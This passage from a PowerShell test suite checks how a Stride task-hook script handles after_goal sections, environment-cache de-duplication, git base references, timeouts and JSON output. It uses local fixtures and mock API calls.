$r = Invoke-HookScript -InputJson $w16Trunc -Phase 'post' -ProjectDir $w16bProj
Assert-Contains "16b: GOAL_ID falls back to data.parent_id under truncation" "goal=[77]" $r.Stdout
Assert-Contains "16b: GOAL_IDENTIFIER still exported from the file" "ident=[G77]" $r.Stdout

# 16c: truncated stdout + present file WITH an after_goal entry, but the
# ## after_goal section is MISSING -> clean no-op (exit 0, no after_goal JSON).
$w16cProj = Join-Path $TmpDir 'w1612-missing'
New-Item -ItemType Directory -Path (Join-Path $w16cProj '.stride') -Force | Out-Null
Set-Content -Path (Join-Path $w16cProj '.stride.md') -Value @'
## before_review
```bash
echo "before_review_ran"
```
'@ -Encoding UTF8
Set-Content -Path (Join-Path $w16cProj '.stride/.last-api-response.json') `
    -Value '{"data":{"id":99},"hooks":[{"name":"after_goal","env":{"GOAL_IDENTIFIER":"G88"}}]}' -Encoding UTF8 -NoNewline
$r = Invoke-HookScript -InputJson $w16Trunc -Phase 'post' -ProjectDir $w16cProj
Assert-Exit "16c: missing ## after_goal under truncation exits 0" 0 $r.ExitCode
Assert-NotContains "16c: missing ## after_goal emits no after_goal JSON" '"hook":"after_goal"' $r.Stdout

# 16d: no-file control — truncated stdout, NO canonical file, and no reachable
# after_goal_status endpoint -> the section must NOT run (no false positive).
$w16dProj = Join-Path $TmpDir 'w1612-nofile'
New-Item -ItemType Directory -Path $w16dProj -Force | Out-Null
Set-Content -Path (Join-Path $w16dProj '.stride.md') -Value @'
## after_goal
```bash
echo "after_goal_ran"
```
'@ -Encoding UTF8
Set-Content -Path (Join-Path $w16dProj '.stride-env-cache') -Value 'TASK_ID=99' -Encoding UTF8
$w16dInput = @{
    tool_input    = @{ command = 'curl -X PATCH http://localhost:19099/api/tasks/99/complete -H "Authorization: Bearer tok"' }
    tool_response = @{ stdout = '{"data":{"id":99},"hoo' }
} | ConvertTo-Json -Compress
$r = Invoke-HookScript -InputJson $w16dInput -Phase 'post' -ProjectDir $w16dProj
Assert-Exit "16d: no-file + truncated + unreachable exits 0" 0 $r.ExitCode
Assert-NotContains "16d: no file + no endpoint does not run ## after_goal" "after_goal_ran" $r.Stdout

# 16e: W2087 — slim completion ack (?response_view=slim): the canonical file
# holds ONLY the 9-field ack + hooks[] -> after_goal detection + GOAL_* export
# still work (mirrors test-stride-hook.sh 20e).
$w16eProj = Join-Path $TmpDir 'w2087-slimack'
New-Item -ItemType Directory -Path (Join-Path $w16eProj '.stride') -Force | Out-Null
Set-Content -Path (Join-Path $w16eProj '.stride.md') -Value @'
## after_goal
```bash
echo "goal=[$GOAL_ID] ident=[$GOAL_IDENTIFIER] title=[$GOAL_TITLE]"
```
'@ -Encoding UTF8
Set-Content -Path (Join-Path $w16eProj '.stride/.last-api-response.json') `
    -Value '{"data":{"id":99,"identifier":"W99","title":"Slim task","status":"done","parent_id":55,"needs_review":false,"review_status":null,"complexity":"medium","priority":"high"},"hooks":[{"name":"before_review"},{"name":"after_goal","env":{"GOAL_ID":"55","GOAL_IDENTIFIER":"G55","GOAL_TITLE":"Goal 55"}}]}' -Encoding UTF8 -NoNewline
$r = Invoke-HookScript -InputJson $w16Trunc -Phase 'post' -ProjectDir $w16eProj
Assert-Exit "16e: slim ack with after_goal exits 0" 0 $r.ExitCode
Assert-Contains "16e: ## after_goal ran off the slim ack" "ident=[G55]" $r.Stdout
Assert-Contains "16e: GOAL_TITLE exported from the slim ack" "title=[Goal 55]" $r.Stdout
$w16eCache = ''
if (Test-Path (Join-Path $w16eProj '.stride-env-cache')) {
    $w16eCache = Get-Content (Join-Path $w16eProj '.stride-env-cache') -Raw -Encoding UTF8
}
Assert-Contains "16e: env cache carries GOAL_ID off the slim ack" "GOAL_ID='55'" $w16eCache

# 16f: negative control — slim ack whose hooks[] has NO after_goal entry ->
# the section must NOT run (mirrors test-stride-hook.sh 20f).
$w16fProj = Join-Path $TmpDir 'w2087-slimneg'
New-Item -ItemType Directory -Path (Join-Path $w16fProj '.stride') -Force | Out-Null
Set-Content -Path (Join-Path $w16fProj '.stride.md') -Value @'
## after_goal
```bash
echo "slim_after_goal_ran"
```
'@ -Encoding UTF8
Set-Content -Path (Join-Path $w16fProj '.stride/.last-api-response.json') `
    -Value '{"data":{"id":99,"identifier":"W99","title":"Slim task","status":"done","parent_id":55,"needs_review":false,"review_status":null,"complexity":"medium","priority":"high"},"hooks":[{"name":"before_review"}]}' -Encoding UTF8 -NoNewline
$r = Invoke-HookScript -InputJson $w16Trunc -Phase 'post' -ProjectDir $w16fProj
Assert-Exit "16f: slim ack without after_goal exits 0" 0 $r.ExitCode
Assert-NotContains "16f: slim ack without after_goal does not run the section" "slim_after_goal_ran" $r.Stdout

# 16g: D245 — after_goal env OMITS GOAL_ID and data.parent_id is set (the
# fallback population): the env cache must carry exactly ONE GOAL_ID line and
# it must hold the parent_id value. Regression lock mirroring
# test-stride-hook.sh 20g — Set-AfterGoalEnv builds one env map and writes the
# cache once, so it structurally cannot duplicate; this pins that geometry.
# (D280) ps1 cache lines are now sq_escape-quoted: GOAL_ID='6'.
$w16gProj = Join-Path $TmpDir 'd245-onegoalid'
New-Item -ItemType Directory -Path (Join-Path $w16gProj '.stride') -Force | Out-Null
Set-Content -Path (Join-Path $w16gProj '.stride.md') -Value @'
## after_goal
```bash
echo "goal=[$GOAL_ID] ident=[$GOAL_IDENTIFIER]"
```
'@ -Encoding UTF8
Set-Content -Path (Join-Path $w16gProj '.stride/.last-api-response.json') `
    -Value '{"data":{"id":99,"identifier":"W99","title":"Slim task","status":"done","parent_id":6,"needs_review":false,"review_status":null,"complexity":"medium","priority":"high"},"hooks":[{"name":"after_goal","env":{"GOAL_IDENTIFIER":"G6"}}]}' -Encoding UTF8 -NoNewline
$r = Invoke-HookScript -InputJson $w16Trunc -Phase 'post' -ProjectDir $w16gProj
Assert-Exit "16g: fallback-firing slim ack exits 0" 0 $r.ExitCode
Assert-Contains "16g: ## after_goal still receives the fallback GOAL_ID" "goal=[6]" $r.Stdout
$w16gCache = @()
if (Test-Path (Join-Path $w16gProj '.stride-env-cache')) {
    $w16gCache = @(Get-Content (Join-Path $w16gProj '.stride-env-cache') -Encoding UTF8)
}
$w16gGoalLines = @($w16gCache | Where-Object { $_ -match '^GOAL_ID=' })
Assert-Eq "16g: env cache carries exactly one GOAL_ID line when the fallback fires" "1" "$($w16gGoalLines.Count)"
Assert-Eq "16g: a first-match reader gets the parent_id value" "GOAL_ID='6'" "$($w16gGoalLines | Select-Object -First 1)"

# 16h: normal-path control for D245 — after_goal env WITH GOAL_ID: still
# exactly one GOAL_ID line holding the server-supplied value (mirrors
# test-stride-hook.sh 20h).
$w16hProj = Join-Path $TmpDir 'd245-normalpath'
New-Item -ItemType Directory -Path (Join-Path $w16hProj '.stride') -Force | Out-Null
Set-Content -Path (Join-Path $w16hProj '.stride.md') -Value @'
## after_goal
```bash
echo "goal=[$GOAL_ID] ident=[$GOAL_IDENTIFIER]"
```
'@ -Encoding UTF8
Set-Content -Path (Join-Path $w16hProj '.stride/.last-api-response.json') `
    -Value '{"data":{"id":99,"parent_id":55},"hooks":[{"name":"after_goal","env":{"GOAL_ID":"55","GOAL_IDENTIFIER":"G55"}}]}' -Encoding UTF8 -NoNewline
$r = Invoke-HookScript -InputJson $w16Trunc -Phase 'post' -ProjectDir $w16hProj
Assert-Exit "16h: supplied-GOAL_ID slim path exits 0" 0 $r.ExitCode
Assert-Contains "16h: ## after_goal receives the supplied GOAL_ID" "goal=[55]" $r.Stdout
$w16hCache = @()
if (Test-Path (Join-Path $w16hProj '.stride-env-cache')) {
    $w16hCache = @(Get-Content (Join-Path $w16hProj '.stride-env-cache') -Encoding UTF8)
}
$w16hGoalLines = @($w16hCache | Where-Object { $_ -match '^GOAL_ID=' })
Assert-Eq "16h: env cache still carries exactly one GOAL_ID line on the normal path" "1" "$($w16hGoalLines.Count)"
Assert-Eq "16h: a first-match reader gets the supplied value" "GOAL_ID='55'" "$($w16hGoalLines | Select-Object -First 1)"

# 16i (D257): mirrors test-stride-hook.sh 20i. 16g/16h pin that a SINGLE run
# cannot duplicate a key — Set-AfterGoalEnv builds one env map and a hashtable
# holds no duplicate key. This port's real exposure is ACROSS runs: Set-HookEnv
# appended then (D260 made it replace in place), and nothing truncates the
# cache between two after_goal runs in one
# claim window. Run 1 establishes GOAL_ID=7 via the fallback; run 2 omits both
# the GOAL_ID env key and parent_id, so its defined-but-empty default appended
# a second, contradictory line. A first-match reader then read the PREVIOUS
# goal's id. The surviving line must be the empty one — the contract is
# defined-but-empty, never absent, and never a stale id.
$w16iProj = Join-Path $TmpDir 'd257-resurrect'
New-Item -ItemType Directory -Path (Join-Path $w16iProj '.stride') -Force | Out-Null
Set-Content -Path (Join-Path $w16iProj '.stride.md') -Value @'
## after_goal
```bash
echo "goal=[$GOAL_ID] ident=[$GOAL_IDENTIFIER]"
```
'@ -Encoding UTF8
Set-Content -Path (Join-Path $w16iProj '.stride/.last-api-response.json') `
    -Value '{"data":{"id":99,"parent_id":7},"hooks":[{"name":"after_goal","env":{"GOAL_IDENTIFIER":"G7"}}]}' -Encoding UTF8 -NoNewline
$r = Invoke-HookScript -InputJson $w16Trunc -Phase 'post' -ProjectDir $w16iProj
Set-Content -Path (Join-Path $w16iProj '.stride/.last-api-response.json') `
    -Value '{"data":{"id":100},"hooks":[{"name":"after_goal","env":{"GOAL_IDENTIFIER":"G8"}}]}' -Encoding UTF8 -NoNewline
$r = Invoke-HookScript -InputJson $w16Trunc -Phase 'post' -ProjectDir $w16iProj
$w16iCache = @()
if (Test-Path (Join-Path $w16iProj '.stride-env-cache')) {
    $w16iCache = @(Get-Content (Join-Path $w16iProj '.stride-env-cache') -Encoding UTF8)
}
$w16iGoalLines = @($w16iCache | Where-Object { $_ -match '^GOAL_ID=' })
Assert-Eq "16i (D257): exactly one GOAL_ID line after a second in-window after_goal" "1" "$($w16iGoalLines.Count)"
Assert-Eq "16i (D257): the surviving line is defined-but-empty, not the previous goal's id" "GOAL_ID=''" "$($w16iGoalLines | Select-Object -First 1)"

# 16j (D257): mirrors test-stride-hook.sh 20j. The three siblings never had any
# de-duplication on this side either, so two in-window runs left a first-match
# reader stitching run 2's GOAL_ID to run 1's GOAL_IDENTIFIER — two goals
# reconstructed as one identity, which is what puts the wrong goal in whatever
# the ## after_goal section builds. GOAL_TITLE, supplied only by run 1, must
# not survive beside run 2's id.
$w16jProj = Join-Path $TmpDir 'd257-siblings'
New-Item -ItemType Directory -Path (Join-Path $w16jProj '.stride') -Force | Out-Null
Set-Content -Path (Join-Path $w16jProj '.stride.md') -Value @'
## after_goal
```bash
echo "goal=[$GOAL_ID] ident=[$GOAL_IDENTIFIER]"
```
'@ -Encoding UTF8
Set-Content -Path (Join-Path $w16jProj '.stride/.last-api-response.json') `
    -Value '{"data":{"id":99,"parent_id":6},"hooks":[{"name":"after_goal","env":{"GOAL_ID":"6","GOAL_IDENTIFIER":"G6","GOAL_TITLE":"Alpha Goal"}}]}' -Encoding UTF8 -NoNewline
$r = Invoke-HookScript -InputJson $w16Trunc -Phase 'post' -ProjectDir $w16jProj
Set-Content -Path (Join-Path $w16jProj '.stride/.last-api-response.json') `
    -Value '{"data":{"id":100,"parent_id":7},"hooks":[{"name":"after_goal","env":{"GOAL_IDENTIFIER":"G7"}}]}' -Encoding UTF8 -NoNewline
$r = Invoke-HookScript -InputJson $w16Trunc -Phase 'post' -ProjectDir $w16jProj
$w16jCache = @()
if (Test-Path (Join-Path $w16jProj '.stride-env-cache')) {
    $w16jCache = @(Get-Content (Join-Path $w16jProj '.stride-env-cache') -Encoding UTF8)
}
foreach ($k in @('GOAL_ID', 'GOAL_IDENTIFIER', 'GOAL_TITLE', 'GOAL_DESCRIPTION')) {
    $w16jLines = @($w16jCache | Where-Object { $_ -match "^$k=" })
    Assert-Eq "16j (D257): exactly one $k line after two in-window after_goal runs" "1" "$($w16jLines.Count)"
}
Assert-Eq "16j (D257): first-match GOAL_ID is the current goal's" "GOAL_ID='7'" `
    "$(@($w16jCache | Where-Object { $_ -match '^GOAL_ID=' }) | Select-Object -First 1)"
Assert-Eq "16j (D257): first-match GOAL_IDENTIFIER is the current goal's" "GOAL_IDENTIFIER='G7'" `
    "$(@($w16jCache | Where-Object { $_ -match '^GOAL_IDENTIFIER=' }) | Select-Object -First 1)"
Assert-Eq "16j (D257): a sibling the current run omitted does not keep the previous goal's value" "GOAL_TITLE=''" `
    "$(@($w16jCache | Where-Object { $_ -match '^GOAL_TITLE=' }) | Select-Object -First 1)"

# 16k (D257): the scope guard, and it has to be built differently from 20l to
# mean anything on this side. The .ps1 filter runs BEFORE Set-HookEnv writes,
# so a non-GOAL key written by the SAME run can never be dropped by it — an
# assertion about the current run would pass no matter how wide the regex got.
# The key that can actually be lost is one a PREVIOUS run wrote, which the
# filter passes over. Run 1 supplies BOARD_NAME; run 2 does not. If the regex
# were widened beyond the four GOAL_* keys, run 1's BOARD_NAME would vanish
# here and every other hook's cached keys would be silently at risk too.
$w16kProj = Join-Path $TmpDir 'd257-scope'
New-Item -ItemType Directory -Path (Join-Path $w16kProj '.stride') -Force | Out-Null
Set-Content -Path (Join-Path $w16kProj '.stride.md') -Value @'
## after_goal
```bash
echo "goal=[$GOAL_ID]"
```
'@ -Encoding UTF8
Set-Content -Path (Join-Path $w16kProj '.stride/.last-api-response.json') `
    -Value '{"data":{"id":99,"parent_id":6},"hooks":[{"name":"after_goal","env":{"GOAL_ID":"6","BOARD_NAME":"Stride Development"}}]}' -Encoding UTF8 -NoNewline
$r = Invoke-HookScript -InputJson $w16Trunc -Phase 'post' -ProjectDir $w16kProj
Set-Content -Path (Join-Path $w16kProj '.stride/.last-api-response.json') `
    -Value '{"data":{"id":100,"parent_id":7},"hooks":[{"name":"after_goal","env":{"GOAL_ID":"7"}}]}' -Encoding UTF8 -NoNewline
$r = Invoke-HookScript -InputJson $w16Trunc -Phase 'post' -ProjectDir $w16kProj
$w16kCache = @()
if (Test-Path (Join-Path $w16kProj '.stride-env-cache')) {
    $w16kCache = @(Get-Content (Join-Path $w16kProj '.stride-env-cache') -Encoding UTF8)
}
Assert-Contains "16k (D257): a non-GOAL key from an EARLIER run survives the collapse" `
    "BOARD_NAME='Stride Development'" "$($w16kCache -join "`n")"
Assert-Eq "16k (D257): and the GOAL_* collapse still applied on that run" "1" `
    "$(@($w16kCache | Where-Object { $_ -match '^GOAL_ID=' }).Count)"
Assert-Eq "16k (D257): holding the second run's goal" "GOAL_ID='7'" `
    "$(@($w16kCache | Where-Object { $_ -match '^GOAL_ID=' }) | Select-Object -First 1)"

# ============================================================
# Test Group 17: D142 — post-pull TASK_BASE_REF + committed-range override
# (mirrors test-stride-hook.sh Test Group 21)
# ============================================================
Write-Host ""
Write-Host "=== Test Group 17: D142 post-pull TASK_BASE_REF + committed-range override ==="

if (-not (Get-Command git -ErrorAction SilentlyContinue)) {
    Write-Host "  SKIP: git not available — Group 17 requires it" -ForegroundColor Yellow
} else {
    # 17a: the claim-time refresh records the POST-pull branch point. A bare
    # origin and a second clone simulate another computer whose completed task
    # arrives via the ## before_doing pull (the D132/W1678 incident).
    $d142Root = Join-Path $TmpDir 'g17-d142'
    New-Item -ItemType Directory -Path $d142Root -Force | Out-Null
    & git init -q --bare (Join-Path $d142Root 'origin.git') 2>$null | Out-Null
    # Point the bare HEAD at main so both clones check out the same branch
    # regardless of the host's init.defaultBranch.
    & git -C (Join-Path $d142Root 'origin.git') symbolic-ref HEAD refs/heads/main 2>$null | Out-Null
    $cloneA = Join-Path $d142Root 'cloneA'
    & git clone -q (Join-Path $d142Root 'origin.git') $cloneA 2>$null | Out-Null
    & git -C $cloneA config user.email 'test@test.local' 2>$null | Out-Null
    & git -C $cloneA config user.name 'Test' 2>$null | Out-Null
    & git -C $cloneA config commit.gpgsign false 2>$null | Out-Null
    & git -C $cloneA checkout -q -b main 2>$null | Out-Null
    Set-Content -Path (Join-Path $cloneA '.gitignore') `
        -Value ".stride.md`n.stride-env-cache`n.stride-changed-files.json`n.stride-diff-upload-state`n.stride-dirty-baseline" -Encoding UTF8
    Set-Content -Path (Join-Path $cloneA 'base.txt') -Value 'base' -Encoding UTF8
    & git -C $cloneA add .gitignore base.txt 2>$null | Out-Null
    & git -C $cloneA commit -q -m 'base' 2>$null | Out-Null
    & git -C $cloneA push -q origin main 2>$null | Out-Null
    $cloneB = Join-Path $d142Root 'cloneB'
    & git clone -q (Join-Path $d142Root 'origin.git') $cloneB 2>$null | Out-Null
    & git -C $cloneB config user.email 'test@test.local' 2>$null | Out-Null
    & git -C $cloneB config user.name 'Test' 2>$null | Out-Null
    & git -C $cloneB config commit.gpgsign false 2>$null | Out-Null
    Set-Content -Path (Join-Path $cloneB 'w1678.txt') -Value 'other' -Encoding UTF8
    & git -C $cloneB add w1678.txt 2>$null | Out-Null
    & git -C $cloneB commit -q -m 'other clone task' 2>$null | Out-Null
    & git -C $cloneB push -q origin main 2>$null | Out-Null

    $prePull = (& git -C $cloneA rev-parse HEAD | Out-String).Trim()
    Set-Content -Path (Join-Path $cloneA '.stride.md') -Value @'
## before_doing
```bash
git pull -q origin main
```
'@ -Encoding UTF8
    # Stale cache from a "previous session" — must be fully replaced.
    Set-Content -Path (Join-Path $cloneA '.stride-env-cache') `
        -Value "TASK_ID=OLD1`nTASK_BASE_REF=1111111111111111111111111111111111111111" -Encoding UTF8
    $d142Claim = @{
        tool_input = @{ command = 'curl -X POST https://stride.example.com/api/tasks/claim' }
        tool_response = @{ stdout = '{"data":{"id":142,"identifier":"D142","title":"Cross clone","status":"in_progress","complexity":"medium","priority":"high"}}'; stderr = ''; interrupted = $false }
    } | ConvertTo-Json -Compress
    $r = Invoke-HookScript -InputJson $d142Claim -Phase 'post' -ProjectDir $cloneA
    Assert-Exit "17a: cross-clone claim exits 0" 0 $r.ExitCode
    $postPull = (& git -C $cloneA rev-parse HEAD | Out-String).Trim()
    if ($prePull -eq $postPull) {
        Write-Host "  FAIL: 17a fixture vacuous — the before_doing pull did not move HEAD" -ForegroundColor Red
        $script:FAIL++
    } else {
        Write-Host "  PASS: 17a fixture: the before_doing pull moved HEAD (discriminating power)" -ForegroundColor Green
        $script:PASS++
    }
    $d142Cache = Get-Content -Raw -Path (Join-Path $cloneA '.stride-env-cache') -ErrorAction SilentlyContinue
    Assert-Contains "17a: claim records the POST-pull branch point as TASK_BASE_REF" "TASK_BASE_REF='$postPull'" $d142Cache
    Assert-NotContains "17a: the stale prior-session TASK_BASE_REF was replaced" "1111111111111111111111111111111111111111" $d142Cache

    # 17b: committed-range override — a baseline entry whose path the task's
    # commits contain is task work and must survive the upload filter (D137
    # silently dropped committed files whose content matched the claim-time
    # hash).
    $crProj = New-GitRepo -Name 'g17-committed'
    $crBase = (& git -C $crProj rev-parse HEAD | Out-String).Trim()
    # Pre-claim dirt, then the auto-commit commits it as the task's work.
    Add-Content -Path (Join-Path $crProj 'tracked.txt') -Value 'task edit present at claim' -Encoding UTF8
    $crHash = (& git -C $crProj hash-object -- 'tracked.txt' | Out-String).Trim()
    Set-Content -Path (Join-Path $crProj '.stride-dirty-baseline') -Value "$crHash tracked.txt" -Encoding UTF8
    & git -C $crProj add tracked.txt 2>$null | Out-Null
    & git -C $crProj commit -q -m 'task auto-commit' 2>$null | Out-Null
    Set-Content -Path (Join-Path $crProj '.stride-changed-files.json') `
        -Value '[{"path":"tracked.txt","diff":"task work"}]' -Encoding UTF8
    Set-Content -Path (Join-Path $crProj '.stride-env-cache') `
        -Value "TASK_ID=99`nTASK_BASE_REF=$crBase" -Encoding UTF8
    Set-Content -Path (Join-Path $crProj '.stride.md') -Value @'
## after_doing
```bash
echo "ran"
```
'@ -Encoding UTF8

    $crPort = 18879
    $crFixture = Join-Path $TmpDir 'd142-put-fixture.json'
    if (Test-Path $crFixture) { Remove-Item -Force $crFixture }
    $crListenerJob = Start-Job -ArgumentList $crPort, $crFixture -ScriptBlock {
        param($Port, $Fixture)
        $l = [System.Net.HttpListener]::new()
        $l.Prefixes.Add("http://localhost:$Port/")
        try {
            $l.Start()
            $ctx = $l.GetContext()
            $req = $ctx.Request
            $reader = [System.IO.StreamReader]::new($req.InputStream)
            $body = $reader.ReadToEnd()
            @{ Body = $body } | ConvertTo-Json -Compress | Set-Content -Path $Fixture -Encoding UTF8
            $resp = $ctx.Response
            $resp.StatusCode = 200
            $resp.OutputStream.Close()
        } catch {
            # Listener tear-down errors are ignored.
        } finally {
            if ($l.IsListening) { $l.Stop() }
        }
    }
    try {
        $null = Wait-ForListener -Port $crPort
        $crCmd = "curl -X PATCH http://localhost:$crPort/api/tasks/99/complete -H `"Authorization: Bearer test_token_cr`""
        $crJson = @{ tool_input = @{ command = $crCmd } } | ConvertTo-Json -Compress
        $r = Invoke-HookScript -InputJson $crJson -Phase 'pre' -ProjectDir $crProj
        Assert-Exit "17b: hook exits 0 after the committed-range PUT" 0 $r.ExitCode

        Wait-Job $crListenerJob -Timeout 8 | Out-Null
        Remove-Job $crListenerJob -Force -ErrorAction SilentlyContinue

        if (Test-Path $crFixture) {
            $record = Get-Content -Raw -Path $crFixture | ConvertFrom-Json
            $parsedBody = $record.Body | ConvertFrom-Json
            $decoded = [System.Convert]::FromBase64String($parsedBody.changed_files.data)
            $decodedText = [System.Text.Encoding]::UTF8.GetString($decoded)
            $entries = @($decodedText | ConvertFrom-Json)
            $paths = @($entries | ForEach-Object { $_.path })
            if ($paths -contains 'tracked.txt') {
                Write-Host "  PASS: 17b: committed task work survives the baseline filter" -ForegroundColor Green
                $script:PASS++
            } else {
                Write-Host "  FAIL: 17b: committed task work was dropped, got: $($paths -join ', ')" -ForegroundColor Red
                $script:FAIL++
            }
        } else {
            Write-Host "  FAIL: 17b: no PUT recorded by the listener" -ForegroundColor Red
            $script:FAIL++
        }
    } finally {
        Remove-Job $crListenerJob -Force -ErrorAction SilentlyContinue
    }
}

# ============================================================
# Test Group 18: D230 — a budget kill must not look like a test failure
# ============================================================
# Mirror of test-stride-hook.sh Test Group 25. The distinction already existed
# on both executors; nothing pinned it for the route that gates completion
# (pre + /complete -> after_doing), so it could regress silently on either side.
Write-Host ""
Write-Host "=== Test Group 18: D230 timeout vs test failure on the after_doing gate ==="

$d230Complete = '{"tool_input":{"command":"curl -X PATCH https://stridelikeaboss.com/api/tasks/99/complete"}}'

# 18a: a genuine command failure blocks the completion and is NOT a timeout.
$d230FailProj = Join-Path $TmpDir 'g18-genuine-failure'
New-Item -ItemType Directory -Path $d230FailProj -Force | Out-Null
Set-Content -Path (Join-Path $d230FailProj '.stride.md') -Value @'
## after_doing
```bash
echo "suite starting"
false
touch should_not_exist.txt
```
'@ -Encoding UTF8
$rFail = Invoke-HookScript -InputJson $d230Complete -Phase 'pre' -ProjectDir $d230FailProj
Assert-Exit "18a: a genuine after_doing failure still blocks the completion" 2 $rFail.ExitCode
Assert-Contains "18a: stderr says FAILED ON, not timed out" `
    "Stride after_doing hook failed on command 2/3" $rFail.Stderr
Assert-Contains "18a: the failure JSON marks timed_out FALSE" '"timed_out":false' $rFail.Stdout
Assert-NotContains "18a: a genuine failure is never reported as exit 124" `
    '"exit_code":124' $rFail.Stdout

# 18b: the same route, killed by the budget instead.
$d230ToProj = Join-Path $TmpDir 'g18-budget-kill'
New-Item -ItemType Directory -Path $d230ToProj -Force | Out-Null
Set-Content -Path (Join-Path $d230ToProj '.stride.md') -Value @'
## after_doing
```bash
echo "suite starting"
sleep 30
touch should_not_exist.txt
```
'@ -Encoding UTF8
$env:STRIDE_HOOK_TIMEOUT_OVERRIDE = "$($script:TimeoutTestBudget)"
try {
    $rTo = Invoke-HookScript -InputJson $d230Complete -Phase 'pre' -ProjectDir $d230ToProj
} finally {
    Remove-Item Env:STRIDE_HOOK_TIMEOUT_OVERRIDE -ErrorAction SilentlyContinue
}
Assert-Exit "18b: a budget kill also blocks the completion" 2 $rTo.ExitCode
Assert-Contains "18b: stderr says TIMED OUT and names the budget" `
    "Stride after_doing hook command 2/3 timed out after $($script:TimeoutTestBudget)s budget" $rTo.Stderr
Assert-Contains "18b: the failure JSON marks timed_out TRUE" '"timed_out":true' $rTo.Stdout
Assert-Contains "18b: the failure JSON carries exit 124" '"exit_code":124' $rTo.Stdout

# 18c: both outcomes block, so the exit code cannot tell them apart — the
# diagnostic value rests entirely on these two signals differing.
if ($rFail.Stdout -match '"timed_out":false' -and $rTo.Stdout -match '"timed_out":true') {
    Write-Host "  PASS: 18c: the two outcomes are distinguishable by timed_out" -ForegroundColor Green
    $script:PASS++
} else {
    Write-Host "  FAIL: 18c: timed_out does not distinguish the two outcomes" -ForegroundColor Red
    $script:FAIL++
}
if ($rFail.Stderr -match 'failed on command' -and $rTo.Stderr -match 'timed out after') {
    Write-Host "  PASS: 18c: ...and by the stderr wording, which a human reads first" -ForegroundColor Green
    $script:PASS++
} else {
    Write-Host "  FAIL: 18c: stderr wording does not distinguish the two outcomes" -ForegroundColor Red
    $script:FAIL++
}

# 18d: what never ran is reported, not silently dropped. Assert the CONTENT —
# an empty commands_remaining would satisfy a key-presence check while telling
# the reader nothing.
Assert-Contains "18d: a budget kill names the command that never ran" `
    'touch should_not_exist.txt' $rTo.Stdout
Assert-Contains "18d: a genuine failure names it too" `
    'touch should_not_exist.txt' $rFail.Stdout

# 18e: and it really did not run. "Reported as remaining" and "never executed"
# are different properties; the fixture plants this sentinel so the second can
# be checked, and 11a already asserts it for its own fixture.
if (Test-Path (Join-Path $d230ToProj 'should_not_exist.txt')) {
    Write-Host "  FAIL: 18e: a budget kill must not run later commands" -ForegroundColor Red
    $script:FAIL++
} else {
    Write-Host "  PASS: 18e: a budget kill does not run later commands" -ForegroundColor Green
    $script:PASS++
}
if (Test-Path (Join-Path $d230FailProj 'should_not_exist.txt')) {
    Write-Host "  FAIL: 18e: a genuine failure must not run later commands" -ForegroundColor Red
    $script:FAIL++
} else {
    Write-Host "  PASS: 18e: a genuine failure does not run later commands" -ForegroundColor Green
    $script:PASS++
}

# ============================================================
# Test Group 20: D238 — stdout is exactly ONE JSON document
# ============================================================
# Mirror of the bash suite's flipped 24e. Claude Code parses hook stdout as one
# document; when a primary section AND after_goal both emit, the old code wrote
# two concatenated objects, a strict parse failed with "Extra data", and every
# harness-facing field was dropped. AC5 of D238 requires both executors to emit
# the SAME shape, and nothing on this side guarded that — the bash assertions
# cannot see a ps1 regression.
#
# STRICT parser only. jq accepts a concatenated stream and cannot detect this.
Write-Host ""
Write-Host "=== Test Group 20: single stdout document (D238) ==="

$d238Proj = Join-Path $TmpDir 'g20-one-doc'
New-Item -ItemType Directory -Path $d238Proj -Force | Out-Null
Set-Content -Path (Join-Path $d238Proj '.stride.md') -Value @'
## before_review
```bash
echo primary_ran
```

## after_goal
```bash
exit 9
```
'@ -Encoding UTF8
$d238Inner = '{"data":{"id":99,"parent_id":42},"hooks":[{"name":"before_review"},{"name":"after_goal","env":{"GOAL_ID":"42","GOAL_IDENTIFIER":"G1","GOAL_TITLE":"t","GOAL_DESCRIPTION":"d"}}]}'
$d238Json = @{
    tool_input = @{ command = 'curl -X PATCH https://stridelikeaboss.com/api/tasks/99/complete' }
    tool_response = @{ stdout = $d238Inner; stderr = ''; interrupted = $false }
} | ConvertTo-Json -Compress
$r20 = Invoke-HookScript -InputJson $d238Json -Phase 'post' -ProjectDir $d238Proj

$d238Probe = @'
import json,sys
s = sys.stdin.read()
try:
    d = json.loads(s)
except Exception:
    print("MULTIPLE"); raise SystemExit
secs = ",".join(x.get("hook","") for x in d.get("sections",[]))
hso = (d.get("hookSpecificOutput") or {}).get("hookEventName","")
print("SINGLE|%s|%s" % (secs, hso))
'@
$d238Res = ($r20.Stdout | & python3 -c $d238Probe) 2>$null
$d238Parts = ("$d238Res".Trim() -split '\|')

Assert-Eq "20a: stdout parses as exactly one JSON document (strict)" "SINGLE" $d238Parts[0]
Assert-Eq "20b: both section results survive the merge, in order" "before_review,after_goal" `
    $(if ($d238Parts.Count -gt 1) { $d238Parts[1] } else { "" })
Assert-Eq "20c: hookSpecificOutput is hoisted to the document root" "PostToolUse" `
    $(if ($d238Parts.Count -gt 2) { $d238Parts[2] } else { "" })

# ============================================================
# Test Group 19: D234 — durable hook result file
# ============================================================
# Mirror of test-stride-hook.sh Test Group 27. Invoke-StrideSection writes its
# JSON straight to the host stdout stream, but Claude Code's PreToolUse contract
# sends exit-0 stdout to the transcript rather than to the model — so on the
# success path there is nothing the agent can read a duration back from. These
# pin the file that makes a real figure obtainable.
#
# This group exists because the two behaviours it covers were originally
# verified BY HAND on the bash side only, and the hand-verification caught a
# real StrictMode defect in this script's Write-HookResult that no automated
# test would have caught. Manual verification does not survive into CI; this
# does.
Write-Host ""
Write-Host "=== Test Group 19: durable hook result (D234) ==="

$d234Claim = '{"tool_input":{"command":"curl -X POST https://stridelikeaboss.com/api/tasks/claim -d {}"}}'
$d234Complete = '{"tool_input":{"command":"curl -X PATCH https://stridelikeaboss.com/api/tasks/99/complete"}}'

# 19a: a successful section writes the file, with the measured duration.
$d234Proj = Join-Path $TmpDir 'g19-success'
New-Item -ItemType Directory -Path $d234Proj -Force | Out-Null
Set-Content -Path (Join-Path $d234Proj '.stride.md') -Value @'
## before_doing
```bash
sleep 1
```
'@ -Encoding UTF8
$r19a = Invoke-HookScript -InputJson $d234Claim -Phase 'post' -ProjectDir $d234Proj
$d234File = Join-Path $d234Proj '.stride/.hook-result-before_doing.json'
if (Test-Path -LiteralPath $d234File) {
    Write-Host "  PASS: 19a: a successful section writes the durable result" -ForegroundColor Green
    $script:PASS++
} else {
    Write-Host "  FAIL: 19a: a successful section must write the durable result" -ForegroundColor Red
    $script:FAIL++
}
